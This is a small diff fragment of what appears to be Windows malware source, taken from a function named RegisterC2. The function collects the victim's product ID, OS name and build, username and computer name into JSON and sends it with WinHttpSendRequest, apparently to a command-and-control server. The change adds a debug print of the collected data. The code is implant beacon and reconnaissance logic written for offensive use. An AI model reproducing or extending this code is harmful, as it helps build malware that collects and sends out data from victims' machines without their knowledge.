@@ -74,6 +74,7 @@ void RegisterC2(){
                 wchar_t* username = CurrentUser();
                 std::string computerName = ComputerName();
                 sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName.c_str());
+                printf("%s\n", jsonData);
                 size_t size = strlen(jsonData) * sizeof(char);
 
                 BOOL result = WinHttpSendRequest(
